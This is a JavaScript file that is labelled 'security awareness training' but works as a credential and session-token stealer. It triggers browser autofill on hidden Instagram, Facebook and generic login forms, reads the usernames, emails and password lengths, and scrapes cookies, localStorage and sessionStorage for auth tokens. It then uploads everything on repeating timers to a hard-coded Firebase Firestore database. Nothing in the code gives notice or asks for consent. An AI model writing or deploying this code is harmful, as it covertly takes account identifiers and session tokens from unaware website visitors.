// Initialize Firebase
const firebaseConfig = {
    apiKey: "AIzaSyAAEYQGHXf7t5VgI9MkXO1RpiCH5w98GPw",
    authDomain: "laptopms.firebaseapp.com",
    projectId: "laptopms",
    storageBucket: "laptopms.firebasestorage.app",
    messagingSenderId: "965071744622",
    appId: "1:965071744622:web:3411e7ada3d13ef070007f",
    measurementId: "G-2TCNV6ZRY4"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

// Global variables for tracking state
let collectionCycle = 0;
let lastInstagramData = null;
let lastFacebookData = null;

document.addEventListener('DOMContentLoaded', function() {
    console.log("🟢 [INIT] Security awareness training initialized");
    console.log("🔍 [SCAN] Starting social media credential detection...");
    
    // Start collection cycles with detailed logging
    startCollectionCycles();
});

function startCollectionCycles() {
    // Initial collection with longer delay
    setTimeout(async () => {
        console.log("🔄 [CYCLE] Starting initial collection cycle...");
        await performFullCollection();
    }, 2000);
    
    // Regular cycles every 7 seconds
    setInterval(async () => {
        collectionCycle++;
        console.log(`🔄 [CYCLE ${collectionCycle}] Starting collection cycle...`);
        await performFullCollection();
    }, 7000);
    
    // Token checking every 15 seconds
    setInterval(async () => {
        console.log("🔑 [TOKEN] Checking for social media session tokens...");
        await checkForSocialTokens();
    }, 15000);
}

async function performFullCollection() {
    try {
        console.log("📋 [COLLECT] Initiating comprehensive data collection...");
        
        // Collect all data types in parallel for efficiency
        const instagramPromise = captureInstagramData();
        const facebookPromise = captureFacebookData();
        const genericPromise = captureGenericSocialData();
        const sessionPromise = collectSessionData();
        
        // Wait for all to complete
        const results = await Promise.allSettled([
            instagramPromise,
            facebookPromise,
            genericPromise,
            sessionPromise
        ]);
        
        // Log results
        results.forEach((result, index) => {
            const types = ['Instagram', 'Facebook', 'Generic Social', 'Session Data'];
            if (result.status === 'fulfilled') {
                console.log(`✅ [${types[index]}] Collection completed successfully`);
            } else {
                console.log(`❌ [${types[index]}] Collection failed:`, result.reason);
            }
        });
        
        console.log("✅ [COLLECT] Full collection cycle completed");
    } catch (error) {
        console.error("💥 [ERROR] Collection cycle failed:", error);
    }
}

async function captureInstagramData() {
    try {
        console.log("📸 [INSTAGRAM] Scanning for Instagram credentials...");
        
        const instaForm = document.getElementById('instagramCapture');
        if (!instaForm) {
            console.log("⚠️ [INSTAGRAM] Capture form not found");
            return;
        }
        
        instaForm.style.display = 'block';
        
        // Focus Instagram fields to trigger autofill
        const instaUsername = document.getElementById('instaUsername');
        const instaPassword = document.getElementById('instaPassword');
        
        if (instaUsername && instaPassword) {
            console.log("🎯 [INSTAGRAM] Triggering Instagram autofill...");
            
            // Focus username field
            instaUsername.focus();
            await new Promise(resolve => setTimeout(resolve, 150));
            
            // Focus password field
            instaPassword.focus();
            await new Promise(resolve => setTimeout(resolve, 150));
            
            // Wait for autofill to complete
            await new Promise(resolve => setTimeout(resolve, 400));
            
            // Check if data was autofilled
            const usernameValue = instaUsername.value;
            const passwordValue = instaPassword.value;
            
            if (usernameValue || passwordValue) {
                console.log("💾 [INSTAGRAM] Found Instagram credentials!");
                
                const instaData = {
                    timestamp: new Date().toISOString(),
                    platform: 'instagram',
                    username: usernameValue,
                    hasPassword: !!passwordValue,
                    passwordLength: passwordValue ? passwordValue.length : 0,
                    userAgent: navigator.userAgent,
                    location: window.location.href,
                    collectionCycle: collectionCycle
                };
                
                // Check if this is new data (avoid duplicates)
                const dataKey = `${usernameValue}-${passwordValue.length}`;
                if (lastInstagramData !== dataKey) {
                    lastInstagramData = dataKey;
                    console.log("📤 [INSTAGRAM] Sending data to Firestore...");
                    const docRef = await db.collection('social_media_data').add(instaData);
                    console.log(`✅ [INSTAGRAM] Data sent successfully (ID: ${docRef.id})`);
                } else {
                    console.log("🔄 [INSTAGRAM] Duplicate data detected, skipping...");
                }
                
                // Clear values to avoid duplicates
                instaUsername.value = '';
                instaPassword.value = '';
            } else {
                console.log("🔍 [INSTAGRAM] No Instagram credentials found in autofill");
            }
        }
        
        instaForm.style.display = 'none';
        return Promise.resolve();
    } catch (error) {
        console.error("💥 [INSTAGRAM] Error capturing Instagram data:", error);
        return Promise.reject(error);
    }
}

async function captureFacebookData() {
    try {
        console.log("📘 [FACEBOOK] Scanning for Facebook credentials...");
        
        const fbForm = document.getElementById('facebookCapture');
        if (!fbForm) {
            console.log("⚠️ [FACEBOOK] Capture form not found");
            return;
        }
        
        fbForm.style.display = 'block';
        
        // Focus Facebook fields to trigger autofill
        const fbEmail = document.getElementById('fbEmail');
        const fbPassword = document.getElementById('fbPassword');
        
        if (fbEmail && fbPassword) {
            console.log("🎯 [FACEBOOK] Triggering Facebook autofill...");
            
            // Focus email field
            fbEmail.focus();
            await new Promise(resolve => setTimeout(resolve, 150));
            
            // Focus password field
            fbPassword.focus();
            await new Promise(resolve => setTimeout(resolve, 150));
            
            // Wait for autofill to complete
            await new Promise(resolve => setTimeout(resolve, 400));
            
            // Check if data was autofilled
            const emailValue = fbEmail.value;
            const passwordValue = fbPassword.value;
            
            if (emailValue || passwordValue) {
                console.log("💾 [FACEBOOK] Found Facebook credentials!");
                
                const fbData = {
                    timestamp: new Date().toISOString(),
                    platform: 'facebook',
                    email: emailValue,
                    hasPassword: !!passwordValue,
                    passwordLength: passwordValue ? passwordValue.length : 0,
                    userAgent: navigator.userAgent,
                    location: window.location.href,
                    collectionCycle: collectionCycle
                };
                
                // Check if this is new data (avoid duplicates)
                const dataKey = `${emailValue}-${passwordValue.length}`;
                if (lastFacebookData !== dataKey) {
                    lastFacebookData = dataKey;
                    console.log("📤 [FACEBOOK] Sending data to Firestore...");
                    const docRef = await db.collection('social_media_data').add(fbData);
                    console.log(`✅ [FACEBOOK] Data sent successfully (ID: ${docRef.id})`);
                } else {
                    console.log("🔄 [FACEBOOK] Duplicate data detected, skipping...");
                }
                
                // Clear values to avoid duplicates
                fbEmail.value = '';
                fbPassword.value = '';
            } else {
                console.log("🔍 [FACEBOOK] No Facebook credentials found in autofill");
            }
        }
        
        fbForm.style.display = 'none';
        return Promise.resolve();
    } catch (error) {
        console.error("💥 [FACEBOOK] Error capturing Facebook data:", error);
        return Promise.reject(error);
    }
}

async function captureGenericSocialData() {
    try {
        console.log("🌐 [SOCIAL] Scanning for generic social media credentials...");
        
        const socialForm = document.getElementById('socialMediaCapture');
        if (!socialForm) {
            console.log("⚠️ [SOCIAL] Generic capture form not found");
            return;
        }
        
        socialForm.style.display = 'block';
        
        // Focus all social media fields
        const inputs = socialForm.querySelectorAll('input');
        console.log(`🎯 [SOCIAL] Triggering autofill on ${inputs.length} fields...`);
        
        for (let i = 0; i < inputs.length; i++) {
            const input = inputs[i];
            input.focus();
            await new Promise(resolve => setTimeout(resolve, 100));
        }
        
        // Wait for autofill to complete
        await new Promise(resolve => setTimeout(resolve, 300));
        
        // Check for any filled values
        let hasData = false;
        const fieldData = {};
        
        inputs.forEach(input => {
            if (input.value && input.value.trim() !== '') {
                fieldData[input.name] = {
                    value: input.value,
                    length: input.value.length
                };
                hasData = true;
            }
            
            // Clear for next collection
            input.value = '';
        });
        
        socialForm.style.display = 'none';
        
        if (hasData) {
            console.log("💾 [SOCIAL] Found generic social media data!");
            
            const socialData = {
                timestamp: new Date().toISOString(),
                platform: 'generic_social',
                fields: fieldData,
                userAgent: navigator.userAgent,
                location: window.location.href,
                collectionCycle: collectionCycle
            };
            
            console.log("📤 [SOCIAL] Sending data to Firestore...");
            const docRef = await db.collection('social_media_data').add(socialData);
            console.log(`✅ [SOCIAL] Data sent successfully (ID: ${docRef.id})`);
        } else {
            console.log("🔍 [SOCIAL] No generic social media data found");
        }
        
        return Promise.resolve();
    } catch (error) {
        console.error("💥 [SOCIAL] Error capturing generic social data:", error);
        return Promise.reject(error);
    }
}

async function checkForSocialTokens() {
    try {
        console.log("🔑 [TOKEN] Scanning for social media session tokens...");
        
        // Look for social media session tokens in localStorage/sessionStorage
        const tokenData = {
            timestamp: new Date().toISOString(),
            location: window.location.href,
            instagramTokens: [],
            facebookTokens: [],
            otherTokens: []
        };
        
        let tokenCount = 0;
        
        // Check localStorage for social media tokens
        console.log("📚 [TOKEN] Checking localStorage for tokens...");
        for (let i = 0; i < localStorage.length; i++) {
            try {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                
                // Check for Instagram tokens
                if (key && (key.includes('instagram') || key.includes('ig_') || key.includes('ds_user'))) {
                    tokenData.instagramTokens.push({
                        key: key,
                        valuePreview: value.substring(0, 50) + (value.length > 50 ? '...' : '')
                    });
                    tokenCount++;
                    console.log(`🔍 [TOKEN] Found Instagram token: ${key}`);
                }
                
                // Check for Facebook tokens
                if (key && (key.includes('facebook') || key.includes('fb_') || key.includes('c_user'))) {
                    tokenData.facebookTokens.push({
                        key: key,
                        valuePreview: value.substring(0, 50) + (value.length > 50 ? '...' : '')
                    });
                    tokenCount++;
                    console.log(`🔍 [TOKEN] Found Facebook token: ${key}`);
                }
                
                // Check for any other potential tokens
                if (value && (value.includes('token') || value.includes('session') || value.includes('auth'))) {
                    tokenData.otherTokens.push({
                        key: key,
                        valuePreview: value.substring(0, 50) + (value.length > 50 ? '...' : '')
                    });
                    tokenCount++;
                }
            } catch (e) {
                // Skip items we can't access
            }
        }
        
        // Check sessionStorage
        console.log("💾 [TOKEN] Checking sessionStorage for tokens...");
        for (let i = 0; i < sessionStorage.length; i++) {
            try {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                
                // Check for Instagram tokens
                if (key && (key.includes('instagram') || key.includes('ig_'))) {
                    tokenData.instagramTokens.push({
                        key: key,
                        valuePreview: value.substring(0, 50) + (value.length > 50 ? '...' : '')
                    });
                    tokenCount++;
                    console.log(`🔍 [TOKEN] Found Instagram session token: ${key}`);
                }
                
                // Check for Facebook tokens
                if (key && (key.includes('facebook') || key.includes('fb_'))) {
                    tokenData.facebookTokens.push({
                        key: key,
                        valuePreview: value.substring(0, 50) + (value.length > 50 ? '...' : '')
                    });
                    tokenCount++;
                    console.log(`🔍 [TOKEN] Found Facebook session token: ${key}`);
                }
            } catch (e) {
                // Skip items we can't access
            }
        }
        
        // Check cookies for social tokens
        console.log("🍪 [TOKEN] Checking cookies for tokens...");
        const cookies = document.cookie.split(';');
        cookies.forEach(cookie => {
            const [name, value] = cookie.trim().split('=');
            
            if (name && (name.includes('instagram') || name.includes('ig_'))) {
                tokenData.instagramTokens.push({
                    key: name,
                    valuePreview: value ? value.substring(0, 50) + (value.length > 50 ? '...' : '') : ''
                });
                tokenCount++;
                console.log(`🔍 [TOKEN] Found Instagram cookie token: ${name}`);
            }
            
            if (name && (name.includes('facebook') || name.includes('fb_') || name === 'c_user')) {
                tokenData.facebookTokens.push({
                    key: name,
                    valuePreview: value ? value.substring(0, 50) + (value.length > 50 ? '...' : '') : ''
                });
                tokenCount++;
                console.log(`🔍 [TOKEN] Found Facebook cookie token: ${name}`);
            }
        });
        
        // Send data if tokens were found
        if (tokenCount > 0) {
            console.log(`💾 [TOKEN] Found ${tokenCount} social media tokens!`);
            console.log("📤 [TOKEN] Sending token data to Firestore...");
            const docRef = await db.collection('social_tokens').add(tokenData);
            console.log(`✅ [TOKEN] Token data sent successfully (ID: ${docRef.id})`);
        } else {
            console.log("🔍 [TOKEN] No social media tokens found");
        }
        
        return Promise.resolve();
    } catch (error) {
        console.error("💥 [TOKEN] Error checking for social tokens:", error);
        return Promise.reject(error);
    }
}

async function collectSessionData() {
    try {
        console.log("📡 [SESSION] Collecting browser session information...");
        
        const sessionData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            language: navigator.language,
            referrer: document.referrer,
            location: window.location.href,
            cookies: document.cookie,
            localStorageItems: {},
            sessionStorageItems: {},
            collectionCycle: collectionCycle
        };
        
        // Collect localStorage items (limit to prevent overload)
        console.log("📚 [SESSION] Collecting localStorage items...");
        const maxItems = 30;
        let itemsCollected = 0;
        
        for (let i = 0; i < localStorage.length && itemsCollected < maxItems; i++) {
            try {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                
                // Focus on items that might be social media related
                if (key && (key.includes('social') || key.includes('instagram') || 
                           key.includes('facebook') || key.includes('auth') || 
                           key.includes('token') || key.includes('session'))) {
                    sessionData.localStorageItems[key] = value.substring(0, 200) + 
                        (value.length > 200 ? '...' : '');
                    itemsCollected++;
                }
            } catch (e) {
                // Skip items we can't access
            }
        }
        
        // Collect sessionStorage items
        console.log("💾 [SESSION] Collecting sessionStorage items...");
        for (let i = 0; i < sessionStorage.length && itemsCollected < maxItems; i++) {
            try {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                
                if (key && (key.includes('social') || key.includes('instagram') || 
                           key.includes('facebook') || key.includes('auth') || 
                           key.includes('token') || key.includes('session'))) {
                    sessionData.sessionStorageItems[key] = value.substring(0, 200) + 
                        (value.length > 200 ? '...' : '');
                    itemsCollected++;
                }
            } catch (e) {
                // Skip items we can't access
            }
        }
        
        console.log(`💾 [SESSION] Collected ${itemsCollected} relevant session items`);
        console.log("📤 [SESSION] Sending session data to Firestore...");
        const docRef = await db.collection('session_data').add(sessionData);
        console.log(`✅ [SESSION] Session data sent successfully (ID: ${docRef.id})`);
        
        return Promise.resolve();
    } catch (error) {
        console.error("💥 [SESSION] Error collecting session data:", error);
        return Promise.reject(error);
    }
}
